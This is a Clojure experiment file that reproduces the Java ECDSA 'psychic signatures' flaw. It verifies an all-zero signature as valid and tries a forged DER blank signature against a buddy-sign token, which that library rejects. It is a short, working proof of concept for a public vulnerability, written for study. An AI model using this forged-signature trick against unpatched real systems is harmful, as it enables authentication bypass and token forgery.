(ns clojure-experiments.security.signing
  (:require [buddy.core.codecs.base64 :as b64]
            [buddy.sign.compact :as sign]))

;;; Java EC vulnerability
;;; https://neilmadden.blog/2022/04/19/psychic-signatures-in-java/
(comment

  (def kpg (java.security.KeyPairGenerator/getInstance "EC"))
  (def keys (.generateKeyPair kpg))
  (def blank-signature (byte-array 64))
  ;; Note that the “InP1363Format” qualifier just makes it easier to demonstrate the bug.
  ;; Signatures in ASN.1 DER format can be exploited in the same way, you just have to do a bit more fiddling with the encoding first,
  ;; but note that JWTs and other formats do use the raw IEEE P1363 format.
  (def signature (java.security.Signature/getInstance "SHA256WithECDSAInP1363Format"))

  (doto signature
    (.initVerify (.getPublic keys))
    (.update (.getBytes "Hello World")))

  (.verify signature blank-signature)
  ;; WHOOPS!
  ;; => true


  ;; how hard it is to do with ordinary DER format? 
  ;; convert to DER encoding: https://replit.com/@javacrypto/CpcJavaEcSignatureConvertP1363ToDer#Main.java/
  ;; (see https://github.com/java-crypto/cross_platform_crypto/blob/main/docs/ecdsa_signature_ieee_p1363_string.md)
  ;; My Java Code for the conversion is here: https://github.com/jumarko/api-security-in-action/blob/main/natter-api/src/main/java/random/CpcJavaEcSignatureConvertP1363ToDer.java

  (String. (b64/encode blank-signature true))
  ;; => "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

  ;; DER encoding for blank signature (as per the conversion code)
  "MAYCAQACAQA"

  #_(def signature (java.security.Signature/getInstance "SHA256WithECDSA"))

  (sign/sign {:user "jumarko"}
             (.getEncoded (.getPrivate keys))
             :alg :es256)
  ;; => "TlBZARFAcAFqBHVzZXJpB2p1bWFya28.zte-zvVmpGop74clF5257qy73jW8nXw0A0HACwm8qNs.MRLxxQoUM8_j5Rj3.AAAAAGJhCqY"

  (sign/unsign "TlBZARFAcAFqBHVzZXJpB2p1bWFya28.zte-zvVmpGop74clF5257qy73jW8nXw0A0HACwm8qNs.MRLxxQoUM8_j5Rj3.AAAAAGJhCqY"
               (.getEncoded (.getPrivate keys))
               :alg :es256)
;; => {:user "jumarko"}

  ;; tamper the signature by replacing the signature (the substring between the first and the second dot)
  ;; with blank signature "MAYCAQACAQA"
  (sign/unsign "TlBZARFAcAFqBHVzZXJpB2p1bWFya28.MAYCAQACAQA.MRLxxQoUM8_j5Rj3.AAAAAGJhCqY"
               (.getEncoded (.getPrivate keys))
               :alg :es256)
  ;; 1. Unhandled clojure.lang.ExceptionInfo
  ;; Message seems corrupt or manipulated.
  ;; {:type :validation, :cause :signature}

  .)
